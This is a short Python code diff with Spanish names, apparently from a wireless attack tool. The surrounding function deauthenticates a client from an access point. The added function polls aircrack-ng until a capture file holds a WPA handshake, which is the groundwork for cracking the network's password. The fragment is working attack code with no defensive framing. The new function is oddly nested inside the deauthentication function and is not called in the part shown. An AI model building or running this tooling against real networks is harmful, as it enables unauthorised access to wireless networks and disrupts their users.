@@ -41,3 +41,25 @@ def desautenticar(interfaz_monitor: str, bssid: str, mac_cliente: str, cantidad_
     )
 
     print(resultado.stdout + resultado.stderr)
+    
+    def esperar_handshake(archivo_cap: str, intentos_maximos: int = 10, espera_segundos: int = 5) -> bool:
+        
+        # Revisa periódicamente si el archivo .cap ya contiene un handshake válido.
+
+        for intento in range(intentos_maximos):
+            resultado = subprocess.run(
+                ["aircrack-ng", "-b", bssid, archivo_cap],
+                capture_output=True,
+                text=True
+            )
+
+            salida = resultado.stdout
+
+            if "1 handshake" in salida:
+                print("¡Handshake capturado!")
+                return True
+
+            print(f"Intento {intento + 1}/{intentos_maximos}: aún no hay handshake, esperando...")
+            time.sleep(espera_segundos)
+
+        return False
